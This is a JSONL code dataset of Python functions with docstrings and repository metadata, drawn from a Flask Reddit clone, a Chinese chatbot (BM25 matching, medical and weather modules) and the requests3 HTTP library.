{"docstring": "\"\"\"\ndefault order by timestamp\nreturn only top levels!\n\"\"\"\n", "func_signal": "def get_comments(self, order_by='timestamp'):\n", "code": "if order_by == 'timestamp':\n    return self.comments.filter_by(depth=1).\\\n        order_by(db.desc(Comment.created_on)).all()[:THREAD.MAX_COMMENTS]\nelse:\n    return self.comments.filter_by(depth=1).\\\n        order_by(db.desc(Comment.created_on)).all()[:THREAD.MAX_COMMENTS]", "path": "flask_reddit\\threads\\models.py", "repo_name": "codelucas/flask_reddit", "stars": 517, "license": "mit", "language": "python", "size": 339}
{"docstring": "\"\"\"\nSubmit comments via ajax\n\"\"\"\n", "func_signal": "def submit_comment():\n", "code": "thread_id = int(request.form['thread_id'])\ncomment_text = request.form['comment_text']\ncomment_parent_id = request.form['parent_id'] # empty means none\n\nif not comment_text:\n    abort(404)\n\nthread = Thread.query.get_or_404(int(thread_id))\ncomment = thread.add_comment(comment_text, comment_parent_id,\n        g.user.id)\n\nreturn jsonify(comment_text=comment.text, date=comment.pretty_date(),\n        username=g.user.username, comment_id=comment.id,\n        margin_left=comment.get_margin_left())", "path": "flask_reddit\\apis\\views.py", "repo_name": "codelucas/flask_reddit", "stars": 517, "license": "mit", "language": "python", "size": 339}
{"docstring": "\"\"\"\nreturns a humanized version of the raw age of this thread,\neg: 34 minutes ago versus 2040 seconds ago.\n\"\"\"\n", "func_signal": "def pretty_date(self, typeof='created'):\n", "code": "if typeof == 'created':\n    return utils.pretty_date(self.created_on)\nelif typeof == 'updated':\n    return utils.pretty_date(self.updated_on)", "path": "flask_reddit\\threads\\models.py", "repo_name": "codelucas/flask_reddit", "stars": 517, "license": "mit", "language": "python", "size": 339}
{"docstring": "\"\"\"\nreturns a humanized version of the raw age of this subreddit,\neg: 34 minutes ago versus 2040 seconds ago.\n\"\"\"\n", "func_signal": "def pretty_date(self, typeof='created'):\n", "code": "if typeof == 'created':\n    return utils.pretty_date(self.created_on)\nelif typeof == 'updated':\n    return utils.pretty_date(self.updated_on)", "path": "flask_reddit\\subreddits\\models.py", "repo_name": "codelucas/flask_reddit", "stars": 517, "license": "mit", "language": "python", "size": 339}
{"docstring": "\"\"\"\nreturn ids of users who voted this thread up\n\"\"\"\n", "func_signal": "def get_voter_ids(self):\n", "code": "select = thread_upvotes.select(thread_upvotes.c.thread_id==self.id)\nrs = db.engine.execute(select)\nids = rs.fetchall() # list of tuples\nreturn ids", "path": "flask_reddit\\threads\\models.py", "repo_name": "codelucas/flask_reddit", "stars": 517, "license": "mit", "language": "python", "size": 339}
{"docstring": "\"\"\"\ndid the user vote already\n\"\"\"\n", "func_signal": "def has_voted(self, user_id):\n", "code": "select_votes = thread_upvotes.select(\n        db.and_(\n            thread_upvotes.c.user_id == user_id,\n            thread_upvotes.c.thread_id == self.id\n        )\n)\nrs = db.engine.execute(select_votes)\nreturn False if rs.rowcount == 0 else True", "path": "flask_reddit\\threads\\models.py", "repo_name": "codelucas/flask_reddit", "stars": 517, "license": "mit", "language": "python", "size": 339}
{"docstring": "\"\"\"\ndefault order by timestamp\n\"\"\"\n", "func_signal": "def get_threads(self, order_by='timestamp'):\n", "code": "if order_by == 'timestamp':\n    return self.threads.order_by(db.desc(Thread.created_on)).\\\n        all()[:SUBREDDIT.MAX_THREADS]\nelse:\n    return self.threads.order_by(db.desc(Thread.created_on)).\\\n        all()[:SUBREDDIT.MAX_THREADS]", "path": "flask_reddit\\subreddits\\models.py", "repo_name": "codelucas/flask_reddit", "stars": 517, "license": "mit", "language": "python", "size": 339}
{"docstring": "\"\"\"\n\u6e05\u7a7a\u4e4b\u524d\u56de\u61c9\u7559\u4e0b\u7684\u7d00\u9304\n\"\"\"\n", "func_signal": "def cleanFormerResult(self):\n", "code": "self.responses = []\nself.segResponses = []\nself.totalWords = 0", "path": "Chatbot\\QuestionAnswering\\responsesEvaluate.py", "repo_name": "zake7749/Chatbot", "stars": 896, "license": "gpl-3.0", "language": "python", "size": 30635}
{"docstring": "# \u69cb\u5efa\u8a5e\u96c6\u8207\u7d00\u9304\u8a5e\u51fa\u73fe\u4f4d\u7f6e\u7684\u5b57\u5178\n", "func_signal": "def calculateIDF(self):\n", "code": "        if len(self.wordset) == 0:\n            self.buildWordSet()\n        if len(self.words_location_record) == 0:\n            self.buildWordLocationRecord()\n# \u8a08\u7b97 idf\n        for word in self.wordset:\n            self.words_idf[word] = math.log2((self.D + .5)/(self.words_location_record[word] + .5))", "path": "Chatbot\\QuestionAnswering\\Matcher\\bm25Matcher.py", "repo_name": "zake7749/Chatbot", "stars": 896, "license": "gpl-3.0", "language": "python", "size": 30635}
{"docstring": "\"\"\"\u4f9d\u7167\u75c7\u72c0\u5c0d\u61c9\u7684\u75be\u75c5\u6578\u8abf\u6574\u75c7\u72c0\u7684\u6b0a\u91cd\uff0c\u75c7\u72c0\u5c0d\u61c9\u7684\u75be\u75c5\u8d8a\u591a\uff0c\u5f97\u5206\u8d8a\u4f4e\n\"\"\"\n", "func_signal": "def calculate_sympthom_weight(dic):\n", "code": "with open('result/symptom_score.txt','w',encoding='utf-8') as output:\n    max = -1\n    min = 99\n    for v in dic.values():\n        if max < len(v.diseases):\n            max = len(v.diseases)\n        elif min > len(v.diseases):\n            min = len(v.diseases)\n\n    for k,v in dic.items():\n        output.write('%s:%.4f\\n' % (k,1- (len(v.diseases) - min) / (max - min) ))", "path": "Chatbot\\task_modules\\medicine\\toolkit.py", "repo_name": "zake7749/Chatbot", "stars": 896, "license": "gpl-3.0", "language": "python", "size": 30635}
{"docstring": "\"\"\"\n\u5efa\u7acb Corpus \u8a5e\u96c6\n\"\"\"\n", "func_signal": "def buildWordSet(self):\n", "code": "for seg_title in self.segTitles:\n    for word in seg_title:\n        self.wordset.add(word)", "path": "Chatbot\\QuestionAnswering\\Matcher\\bm25Matcher.py", "repo_name": "zake7749/Chatbot", "stars": 896, "license": "gpl-3.0", "language": "python", "size": 30635}
{"docstring": "\"\"\"\n\u64f4\u5145 self.seg_titles \u70ba n-gram\n\"\"\"\n", "func_signal": "def addNgram(self,n):\n", "code": "idx = 0\n\nfor seg_list in self.segTitles:\n    ngram = self.generateNgram(n,self.titles[idx])\n    seg_list = seg_list + ngram\n    idx += 1", "path": "Chatbot\\QuestionAnswering\\Matcher\\bm25Matcher.py", "repo_name": "zake7749/Chatbot", "stars": 896, "license": "gpl-3.0", "language": "python", "size": 30635}
{"docstring": "\"\"\"\n\u8b80\u5165\u4f7f\u7528\u8005 query\uff0c\u82e5\u8a9e\u6599\u5eab\u4e2d\u5b58\u5728\u985e\u4f3c\u7684\u53e5\u5b50\uff0c\u4fbf\u56de\u50b3\u8a72\u53e5\u5b50\u8207\u6a19\u865f\n\nArgs:\n    - query: \u4f7f\u7528\u8005\u6b32\u67e5\u8a62\u7684\u8a9e\u53e5\n\"\"\"\n\n", "func_signal": "def match(self, query):\n", "code": "seg_query = self.wordSegmentation(query)\nmax = -1\ntarget = ''\ntarget_idx = -1\n\ntarget_index = self.searcher.quickSearch(seg_query) #  \u53ea\u53d6\u51fa\u5fc5\u8981\u7684 titles\n\nfor index in target_index:\n    score = self.sim(seg_query, index)\n    if score > max:\n        target_idx = index\n        max = score\n\n# normalization\nmax = max / self.sim(self.segTitles[target_idx],target_idx)\ntarget = ''.join(self.segTitles[target_idx])\nself.similarity = max * 100 #\u767e\u5206\u5236\n\nreturn target,target_idx", "path": "Chatbot\\QuestionAnswering\\Matcher\\bm25Matcher.py", "repo_name": "zake7749/Chatbot", "stars": 896, "license": "gpl-3.0", "language": "python", "size": 30635}
{"docstring": "\"\"\"\n\u5efa\u69cb\u8a5e\u8207\u8a5e\u51fa\u73fe\u4f4d\u7f6e\uff08\u53e5\u5b50id\uff09\u7684\u5b57\u5178\n\"\"\"\n", "func_signal": "def buildWordLocationRecord(self):\n", "code": "for idx,seg_title in enumerate(self.segTitles):\n    for word in seg_title:\n        if self.words_location_record[word] is None:\n            self.words_location_record[word] = set()\n        self.words_location_record[word].add(idx)", "path": "Chatbot\\QuestionAnswering\\Matcher\\bm25Matcher.py", "repo_name": "zake7749/Chatbot", "stars": 896, "license": "gpl-3.0", "language": "python", "size": 30635}
{"docstring": "\"\"\"\n\u4f9d\u7167\u6bcf\u500b\u8a5e\u51fa\u73fe\u7684\u5728\u8a72\u6587\u4ef6\u51fa\u73fe\u7684\u60c5\u5f62\uff0c\u7d66\u4e88\u6bcf\u500b\u56de\u8986\u4e00\u500b\u5206\u6578\n\u82e5\u8a72\u56de\u8986\u5305\u542b\u8d8a\u591a\u9ad8\u8a5e\u983b\u7684\u8a5e\uff0c\u5176\u5f97\u5206\u8d8a\u9ad8\n\nArgs:\n    - \u82e5 debug \u70ba True\uff0c\u5217\u51fa\u6bcf\u7b46\u8a55\u8ad6\u7684\u8a55\u5206\u8207\u65b7\u8a5e\u60c5\u5f62\n\nReturn: (BestResponse,Grade)\n    - BestResponse: \u5f97\u5206\u6700\u9ad8\u7684\u56de\u8986\n    - Grade: \u8a72\u56de\u8986\u7372\u5f97\u7684\u5206\u6578\n\"\"\"\n", "func_signal": "def evaluateByGrade(self,topk,debug=False):\n", "code": "bestResponse = \"\"\ncandiates = []\n\navgWords = self.totalWords/len(self.segResponses)\n\nfor i in range(0, len(self.segResponses)):\n\n    wordCount = len(self.segResponses[i])\n    sourceCount = len(self.responses[i])\n    meanful = 0\n\n    if wordCount == 0 or sourceCount > 24:\n        continue\n\n    cur_grade = 0.\n\n    for word in self.segResponses[i]:\n        wordWeight = self.counterDictionary[word]\n        if wordWeight > 1:\n            meanful += math.log(wordWeight,10)\n        cur_grade += wordWeight\n\n    cur_grade = cur_grade * meanful / (math.log(len(self.segResponses[i])+1,avgWords) + 1)\n    candiates.append([self.responses[i],cur_grade])\n\n    if debug:\n        result = self.responses[i] + '\\t' + str(self.segResponses[i]) + '\\t' + str(cur_grade)\n        self.debugLog.write(result+'\\n')\n        print(result)\n\ncandiates = sorted(candiates,key=lambda candiate:candiate[1],reverse=True)\nreturn candiates[:topk]", "path": "Chatbot\\QuestionAnswering\\responsesEvaluate.py", "repo_name": "zake7749/Chatbot", "stars": 896, "license": "gpl-3.0", "language": "python", "size": 30635}
{"docstring": "\"\"\"\n\u900f\u904e\u75c7\u72c0\u6a39\uff0c\u53d6\u5f97\u53ef\u80fd\u7684\u75c7\u72c0\u5be6\u9ad4\n\"\"\"\n# 0.88 \u662f\u70ba\u4e86\u64cb \u201c\u5c3f\u75db \u9178\u75db\u201d\n", "func_signal": "def hard_extract(self, keywords):\n", "code": "while True:\n    domain = self.rule_match(keywords,reasoning_root=\"\u75c5\u75c7\",\n                             threshold=0.88, remove=False)\n    if domain is not None:\n        print(\"[DEBUG]: hard_extract %s\" % domain)\n        if domain != \"\u75bc\u75db\": # \u907f\u514d\u300c\u75db\u300d\u88ab\u522a\u9664\uff0c\u5f71\u97ff n-gram \u904b\u4f5c\n            self.symptom_dic[domain] = True\n            keywords.pop(self._matchee_index)\n    else:\n        break", "path": "Chatbot\\task_modules\\medicine\\medicine.py", "repo_name": "zake7749/Chatbot", "stars": 896, "license": "gpl-3.0", "language": "python", "size": 30635}
{"docstring": "\"\"\"\n\u6839\u64da\u62bd\u53d6\u51fa\u7684\u75c7\u72c0\u7279\u5fb5\uff0c\u6c7a\u5b9a\u662f\u9032\u5165\u91ab\u751f\u8a3a\u65b7\u6216\u662f\u7d14\u7cb9\u63d0\u4f9b\u5efa\u8b70\n\"\"\"\n", "func_signal": "def look_up(self, domain):\n", "code": "if domain == \"\u626d\u50b7\" or domain == \"\u9f3b\u5b50\u904e\u654f\" or domain == \"\u98df\u7269\u904e\u654f\" or domain == \"\u62bd\u7b4b\" or domain == \"\u7600\u8840\":\n    return False\nelse:\n    return True", "path": "Chatbot\\task_modules\\medicine\\medicine.py", "repo_name": "zake7749/Chatbot", "stars": 896, "license": "gpl-3.0", "language": "python", "size": 30635}
{"docstring": "#TODO GET USER'S QA BY api_key\n        #FIXME REPLACE TESTING DATA TO FORMAL ONE(GET BY DATABASE).\n        #i.e IMPLEMENT getUserQA(api_key)\n        #customqa_list = json.loads(getUserQA(api_key))\n\n", "func_signal": "def getCustomQA(self, sentence, api_key, threshold=50):\n", "code": "        data = '[{\"question\": \"\u4f60\u597d\u55ce?\",\"answers\": [\"\u5f88\u597d\",\"\u4e0d\u592a\u597d\"]},{\"question\": \"\u5403\u98fd\u4e86\u6c92?\",\"answers\": [\"\u6b63\u8981\u5403\",\"\u525b\u5403\u98fd\"]}]'\n        customqa_list = json.loads(data)\n# Load question to a list.\n        q_list = [qa[\"question\"] for qa in customqa_list]\n#TODO 1.  customized threshold.\n#NOTICE: Always choose fuzzy matcher for custom matching.\n        title,index = self.fuzzy_matcher.match(sentence,custom_title=q_list)\n        sim = self.fuzzy_matcher.getSimilarity()\n        if sim < threshold:\n            return None,0\n        return customqa_list[index][\"answers\"][random.randrange(0,len(customqa_list[index][\"answers\"]))],sim", "path": "Chatbot\\QuestionAnswering\\qaBase.py", "repo_name": "zake7749/Chatbot", "stars": 896, "license": "gpl-3.0", "language": "python", "size": 30635}
{"docstring": "\"\"\"\nReturn:\n\t- response : String, \u91dd\u5c0d\u4f7f\u7528\u8005\u7684\u63d0\u554f\u7d66\u4e88\u7684\u7b54\u8986\n\t- status   : List, \u82e5\u9032\u5165\u67d0\u500b\u4efb\u52d9\uff0c\u5247\u56de\u50b3\u76ee\u524d\u4efb\u52d9\u5df2\u77e5\u7684\u6240\u6709\u5c6c\u6027\nArgs:\n\t- target   : String, \u5c0d\u7167 get_query \u7684\u5f62\u5f0f\uff0c\u8868\u793a\u7576\u524d\u7684user_input\u662f\u4f86\u81ea\n\t\t\t\t bubble button\uff0c\u7528\u4f86\u56de\u5fa9\u8a72target_attr\u4e4b\u72c0\u614b\n\"\"\"\n", "func_signal": "def get_response(self,user_input, domain, target):\n", "code": "xml_path = \"\"\noutput = \"\"\nkeyword = self.console.word_segment(user_input) #return a list\n#weather_locate = user_input\n#domain = \u5929\u6c23??\t\t\n\nif \"\u53f0\u5317\" in keyword :\n\txml_path = \"http://www.cwb.gov.tw/rss/forecast/36_01.xml\"\nelif \"\u9ad8\u96c4\" in keyword:\n\txml_path = \"http://www.cwb.gov.tw/rss/forecast/36_02.xml\"\nelif \"\u57fa\u9686\" in keyword:\n\txml_path = \"http://www.cwb.gov.tw/rss/forecast/36_03.xml\"\nelif \"\u65b0\u5317\"  in keyword:\n\txml_path = \"http://www.cwb.gov.tw/rss/forecast/36_04.xml\"\nelif \"\u6843\u5712\"  in keyword:\n\txml_path = \"http://www.cwb.gov.tw/rss/forecast/36_05.xml\"\nelif \"\u65b0\u7af9\"  in keyword:\n\txml_path = \"http://www.cwb.gov.tw/rss/forecast/36_06.xml\"\nelif \"\u82d7\u6817\"  in keyword:\n\txml_path = \"http://www.cwb.gov.tw/rss/forecast/36_07.xml\"\nelif \"\u53f0\u4e2d\"  in keyword:\n\txml_path = \"http://www.cwb.gov.tw/rss/forecast/36_08.xml\"\nelif \"\u5f70\u5316\"  in keyword:\n\txml_path = \"http://www.cwb.gov.tw/rss/forecast/36_09.xml\"\nelif \"\u5357\u6295\"  in keyword:\n\txml_path = \"http://www.cwb.gov.tw/rss/forecast/36_10.xml\"\nelif \"\u96f2\u6797\"  in keyword:\n\txml_path = \"http://www.cwb.gov.tw/rss/forecast/36_11.xml\"\nelif \"\u5609\u7fa9\"  in keyword:\n\txml_path = \"http://www.cwb.gov.tw/rss/forecast/36_12.xml\"\nelif \"\u53f0\u5357\"  in keyword:\n\txml_path = \"http://www.cwb.gov.tw/rss/forecast/36_13.xml\"\nelif \"\u5c4f\u6771\"  in keyword:\n\txml_path = \"http://www.cwb.gov.tw/rss/forecast/36_15.xml\"\nelif \"\u5b9c\u862d\"  in keyword:\n\txml_path = \"http://www.cwb.gov.tw/rss/forecast/36_17.xml\"\nelif \"\u82b1\u84ee\"  in keyword:\n\txml_path = \"http://www.cwb.gov.tw/rss/forecast/36_18.xml\"\nelif \"\u53f0\u6771\"  in keyword:\n\txml_path = \"http://www.cwb.gov.tw/rss/forecast/36_19.xml\"\nelif \"\u6f8e\u6e56\"  in keyword:\n\txml_path = \"http://www.cwb.gov.tw/rss/forecast/36_20.xml\"\nelif \"\u91d1\u9580\"  in keyword:\n\txml_path = \"http://www.cwb.gov.tw/rss/forecast/36_21.xml\"\nelif \"\u9023\u6c5f\"  in keyword:\n\txml_path = \"http://www.cwb.gov.tw/rss/forecast/36_22.xml\"\nelif \"\u99ac\u7956\"  in keyword:\n\txml_path = \"http://www.cwb.gov.tw/rss/forecast/36_22.xml\"\nelse :\n\toutput = \"\u627e\u4e0d\u5230\u95dc\u65bc\u8a72\u7e23(\u5e02)\u7684\u8cc7\u6599\"\n\treturn [None,output]\n\nweather_file = urllib.request.urlopen(xml_path)\nread_file = weather_file.read().decode('utf-8')\ntree = ET.fromstring(read_file)\t\nweather_file.close()\nif \"\u4eca\u5929\" in keyword:\n\troot = tree.iterfind('channel/item/title')\n\tfor day in root:\n\t\toutput = day.text\n\t\tbreak\nelif \"\u660e\u5929\" in keyword:\n\troot = tree.iterfind('channel/item/description')\n\tfor next in root:\n\t\toutput = next.text\n\t\tbreak\n#\u9700\u8981\u66f4\u7cbe\u78ba\u5224\u65b7\t\t\nelif \"\u4e0b\u9031\" in keyword: \n\troot = tree.iterfind('channel/item/description')\n\tfor next in root:\n\t\tbreak\n\tfor next in root:\n\t\toutput = next.text.replace('<BR>','').replace('\\t','')\n\t\tbreak\nelse :\n\toutput = \"out of range\"\n\nreturn [None,output]", "path": "Chatbot\\task_modules\\other\\weather.py", "repo_name": "zake7749/Chatbot", "stars": 896, "license": "gpl-3.0", "language": "python", "size": 30635}
{"docstring": "\"\"\"\n\u70ba self.segResponses \u4e2d\u7684\u8a5e\u914d\u7f6e\u4e00\u500b id\n\"\"\"\n", "func_signal": "def buildTokenDictionary(self):\n", "code": "self.tokenDictionary = corpora.Dictionary(self.segResponses)\nlogging.info(\"\u8a5e\u888b\u5b57\u5178\u5efa\u7f6e\u5b8c\u6210\uff0c%s\" % str(self.tokenDictionary))", "path": "Chatbot\\QuestionAnswering\\responsesEvaluate.py", "repo_name": "zake7749/Chatbot", "stars": 896, "license": "gpl-3.0", "language": "python", "size": 30635}
{"docstring": "\"\"\"\nEncapsulate getResponseForGeneralQA\nFor details on the matching method, please refer PTT-Chat-Generator repo on github.\n\nReturn:\n    - response, similarity\n    if the similarity < threshold will return None,0.\n\"\"\"\n\n#FIXME Remove this flag when all have done.\n", "func_signal": "def getResponseForQA(self, sentence, threshold=0):\n", "code": "if self.github_qa_unupdated:\n    return None, 0\n\nresponse,sim = self.answerer.getResponse(sentence)\n\nif sim > threshold:\n    return response,sim\n\nreturn None,0", "path": "Chatbot\\chatbot.py", "repo_name": "zake7749/Chatbot", "stars": 896, "license": "gpl-3.0", "language": "python", "size": 30635}
{"docstring": "\"\"\"\u53bb\u9664\u8b80\u5165\u8cc7\u6599\u4e2d\u7684\u63db\u884c\u7b26\u8207 ',' \u7d50\u5c3e\n\"\"\"\n", "func_signal": "def cleanline(line):\n", "code": "line = line.strip('\\n')\nline = line.strip(',')\nreturn line", "path": "Chatbot\\task_modules\\medicine\\toolkit.py", "repo_name": "zake7749/Chatbot", "stars": 896, "license": "gpl-3.0", "language": "python", "size": 30635}
{"docstring": "\"\"\"\n\u5c0d self.responses \u4e2d\u6240\u6709\u7684\u56de\u61c9\u65b7\u8a5e\u4e26\u53bb\u9664\u4e2d\u6587\u505c\u7528\u8a5e\uff0c\u5132\u5b58\u65bc self.segResponses\n\"\"\"\n", "func_signal": "def segmentResponse(self):\n", "code": "self.segResponses = []\nfor response in self.responses:\n    keywordResponse = [keyword for keyword in self.wordSegmentation(response)\n                       if keyword not in self.stopwords\n                       and keyword != ' ']\n    self.totalWords += len(keywordResponse)\n    self.segResponses.append(keywordResponse)\n#logging.info(\"\u5df2\u5b8c\u6210\u56de\u61c9\u65b7\u8a5e\")", "path": "Chatbot\\QuestionAnswering\\responsesEvaluate.py", "repo_name": "zake7749/Chatbot", "stars": 896, "license": "gpl-3.0", "language": "python", "size": 30635}
{"docstring": "\"\"\"\n\u7d71\u8a08 self.segResponses \u4e2d\u6bcf\u500b\u8a5e\u51fa\u73fe\u7684\u6b21\u6578\n\"\"\"\n", "func_signal": "def buildCounterDictionary(self):\n", "code": "for reply in self.segResponses:\n    for word in reply:\n        self.counterDictionary[word] += 1\n#logging.info(\"\u8a08\u6578\u5b57\u5178\u5efa\u7f6e\u5b8c\u6210\")", "path": "Chatbot\\QuestionAnswering\\responsesEvaluate.py", "repo_name": "zake7749/Chatbot", "stars": 896, "license": "gpl-3.0", "language": "python", "size": 30635}
{"docstring": "\"\"\"\n\u5f9e self.responses \u4e2d\u6311\u9078\u51fa\u53ef\u9760\u5ea6\u524d K \u9ad8\u7684\u56de\u61c9\u56de\u50b3\n\nReturn : List of (reply,grade)\n\"\"\"\n", "func_signal": "def getBestResponse(self, responses, topk, debugMode=False):\n", "code": "self.cleanFormerResult()\n\nself.buildResponses(responses)\nself.segmentResponse()\nself.buildCounterDictionary()\ncandiateList = self.evaluateByGrade(topk, debug=debugMode)\n\nreturn candiateList", "path": "Chatbot\\QuestionAnswering\\responsesEvaluate.py", "repo_name": "zake7749/Chatbot", "stars": 896, "license": "gpl-3.0", "language": "python", "size": 30635}
{"docstring": "#into interactive console\n", "func_signal": "def listen(self):\n", "code": "while True:\n    self.show_information()\n    choice = input('Your choice is: ')\n    choice = choice.lower()\n    if choice == 'e':\n        res = self.jieba_tf_idf()\n        for tag, weight in res:\n            print('%s %s' % (tag, weight))\n    elif choice == 'g':\n        res = self.jieba_textrank()\n        for tag, weight in res:\n            print('%s %s' % (tag, weight))\n    elif choice == 'p':\n        print(self.rb)\n    elif choice == 'r':\n        self.rb.load_rules('RuleMatcher/rule/',reload=True)\n    elif choice == 'd':\n        self.test_speech()\n    elif choice == 'm':\n        speech = input('Input a sentence:')\n        res,path = self.rule_match(speech)\n        self.write_output(speech,res,path)\n    elif choice == 'b':\n        exit()\n    elif choice == 's':\n        rule_id = input('Input a rule id:')\n        res = self.get_response(rule_id)\n        if res is not None:\n            print(res)\n    elif choice == 'o':\n        self.rb.output_as_json()\n    else:\n        print('[Opps!] No such choice: ' + choice + '.')", "path": "Chatbot\\console.py", "repo_name": "zake7749/Chatbot", "stars": 896, "license": "gpl-3.0", "language": "python", "size": 30635}
{"docstring": "\"\"\"\nReturn:\n    - response : String, \u91dd\u5c0d\u4f7f\u7528\u8005\u7684\u63d0\u554f\u7d66\u4e88\u7684\u7b54\u8986\n    - status   : List, \u82e5\u9032\u5165\u67d0\u500b\u4efb\u52d9\uff0c\u5247\u56de\u50b3\u76ee\u524d\u4efb\u52d9\u5df2\u77e5\u7684\u6240\u6709\u5c6c\u6027\nArgs:\n    - target   : String, \u5c0d\u7167 get_query \u7684\u5f62\u5f0f\uff0c\u8868\u793a\u7576\u524d\u7684user_input\u662f\u4f86\u81ea\n                 bubble button\uff0c\u7528\u4f86\u56de\u5fa9\u8a72target_attr\u4e4b\u72c0\u614b\n\"\"\"\n    #\u4f9d\u64dadomain\u800c\u5224\u65b7missing Attribute\n    #\u5f9e\u53e5\u5b50\u6488attribute(\u5982\u679c\u6709\u7684\u8a71)\n    #\u6c92\u6709\u5247\u554f\u597d\u554f\u6eff\n#keywords = self.console.word_segment(user_input)\n", "func_signal": "def get_response(self,user_input, domain, target):\n", "code": "self.current_domain = domain\n#res=\"test\"\n#clear demand: return domain\n#hidden demand: ?\n\nself.ret = domain + \"#\" + domain\nreturn [None,self.ret]", "path": "Chatbot\\task_modules\\purchase\\purchase.py", "repo_name": "zake7749/Chatbot", "stars": 896, "license": "gpl-3.0", "language": "python", "size": 30635}
{"docstring": "\"\"\"\nLoad certificates and maybe keys from a number of files. Has the end goal\nof returning a CFArray containing one SecIdentityRef, and then zero or more\nSecCertificateRef objects, suitable for use as a client certificate trust\nchain.\n\"\"\"\n# Ok, the strategy.\n#\n# This relies on knowing that macOS will not give you a SecIdentityRef\n# unless you have imported a key into a keychain. This is a somewhat\n# artificial limitation of macOS (for example, it doesn't necessarily\n# affect iOS), but there is nothing inside Security.framework that lets you\n# get a SecIdentityRef without having a key in a keychain.\n#\n# So the policy here is we take all the files and iterate them in order.\n# Each one will use SecItemImport to have one or more objects loaded from\n# it. We will also point at a keychain that macOS can use to work with the\n# private key.\n#\n# Once we have all the objects, we'll check what we actually have. If we\n# already have a SecIdentityRef in hand, fab: we'll use that. Otherwise,\n# we'll take the first certificate (which we assume to be our leaf) and\n# ask the keychain to give us a SecIdentityRef with that cert's associated\n# key.\n#\n# We'll then return a CFArray containing the trust chain: one\n# SecIdentityRef and then zero-or-more SecCertificateRef objects. The\n# responsibility for freeing this CFArray will be with the caller. This\n# CFArray must remain alive for the entire connection, so in practice it\n# will be stored with a single SSLSocket, along with the reference to the\n# keychain.\n", "func_signal": "def _load_client_cert_chain(keychain, *paths):\n", "code": "certificates = []\nidentities = []\n# Filter out bad paths.\npaths = (path for path in paths if path)\ntry:\n    for file_path in paths:\n        new_identities, new_certs = _load_items_from_file(keychain, file_path)\n        identities.extend(new_identities)\n        certificates.extend(new_certs)\n    # Ok, we have everything. The question is: do we have an identity? If\n    # not, we want to grab one from the first cert we have.\n    if not identities:\n        new_identity = Security.SecIdentityRef()\n        status = Security.SecIdentityCreateWithCertificate(\n            keychain, certificates[0], ctypes.byref(new_identity)\n        )\n        _assert_no_error(status)\n        identities.append(new_identity)\n        # We now want to release the original certificate, as we no longer\n        # need it.\n        CoreFoundation.CFRelease(certificates.pop(0))\n    # We now need to build a new CFArray that holds the trust chain.\n    trust_chain = CoreFoundation.CFArrayCreateMutable(\n        CoreFoundation.kCFAllocatorDefault,\n        0,\n        ctypes.byref(CoreFoundation.kCFTypeArrayCallBacks),\n    )\n    for item in itertools.chain(identities, certificates):\n        # ArrayAppendValue does a CFRetain on the item. That's fine,\n        # because the finally block will release our other refs to them.\n        CoreFoundation.CFArrayAppendValue(trust_chain, item)\n    return trust_chain\n\nfinally:\n    for obj in itertools.chain(identities, certificates):\n        CoreFoundation.CFRelease(obj)", "path": "requests3\\core\\_http\\contrib\\_securetransport\\low_level.py", "repo_name": "kennethreitz-archive/requests3", "stars": 793, "license": "cc0-1.0", "language": "python", "size": 9967}
{"docstring": "\"\"\"\nMerge a dictionary of override values for self.connection_pool_kw.\n\nThis does not modify self.connection_pool_kw and returns a new dict.\nAny keys in the override dictionary with a value of ``None`` are\nremoved from the merged dictionary.\n\"\"\"\n", "func_signal": "def _merge_pool_kwargs(self, override):\n", "code": "base_pool_kwargs = self.connection_pool_kw.copy()\nif override:\n    for key, value in override.items():\n        if value is None:\n            try:\n                del base_pool_kwargs[key]\n            except KeyError:\n                pass\n        else:\n            base_pool_kwargs[key] = value\nreturn base_pool_kwargs", "path": "requests3\\core\\_http\\_sync\\poolmanager.py", "repo_name": "kennethreitz-archive/requests3", "stars": 793, "license": "cc0-1.0", "language": "python", "size": 9967}
{"docstring": "\"\"\"\nReturns True if a given CFTypeRef is an identity.\n\"\"\"\n", "func_signal": "def _is_identity(item):\n", "code": "expected = Security.SecIdentityGetTypeID()\nreturn CoreFoundation.CFGetTypeID(item) == expected", "path": "requests3\\core\\_http\\contrib\\_securetransport\\low_level.py", "repo_name": "kennethreitz-archive/requests3", "stars": 793, "license": "cc0-1.0", "language": "python", "size": 9967}
{"docstring": "\"\"\"\nGiven a bytestring, create a CFData object from it. This CFData object must\nbe CFReleased by the caller.\n\"\"\"\n", "func_signal": "def _cf_data_from_bytes(bytestring):\n", "code": "return CoreFoundation.CFDataCreate(\n    CoreFoundation.kCFAllocatorDefault, bytestring, len(bytestring)\n)", "path": "requests3\\core\\_http\\contrib\\_securetransport\\low_level.py", "repo_name": "kennethreitz-archive/requests3", "stars": 793, "license": "cc0-1.0", "language": "python", "size": 9967}
{"docstring": "\"\"\"\nSimilar to :func:`urllib3.connectionpool.connection_from_url`.\n\nIf ``pool_kwargs`` is not provided and a new pool needs to be\nconstructed, ``self.connection_pool_kw`` is used to initialize\nthe :class:`urllib3.connectionpool.ConnectionPool`. If ``pool_kwargs``\nis provided, it is used instead. Note that if a new pool does not\nneed to be created for the request, the provided ``pool_kwargs`` are\nnot used.\n\"\"\"\n", "func_signal": "def connection_from_url(self, url, pool_kwargs=None):\n", "code": "u = parse_url(url)\nreturn self.connection_from_host(\n    u.host, port=u.port, scheme=u.scheme, pool_kwargs=pool_kwargs\n)", "path": "requests3\\core\\_http\\_sync\\poolmanager.py", "repo_name": "kennethreitz-archive/requests3", "stars": 793, "license": "cc0-1.0", "language": "python", "size": 9967}
{"docstring": "\"\"\"\nChecks the return code and throws an exception if there is an error to\nreport\n\"\"\"\n", "func_signal": "def _assert_no_error(error, exception_class=None):\n", "code": "if error == 0:\n    return\n\ncf_error_string = Security.SecCopyErrorMessageString(error, None)\noutput = _cf_string_to_unicode(cf_error_string)\nCoreFoundation.CFRelease(cf_error_string)\nif output is None or output == u\"\":\n    output = u\"OSStatus %s\" % error\nif exception_class is None:\n    exception_class = ssl.SSLError\nraise exception_class(output)", "path": "requests3\\core\\_http\\contrib\\_securetransport\\low_level.py", "repo_name": "kennethreitz-archive/requests3", "stars": 793, "license": "cc0-1.0", "language": "python", "size": 9967}
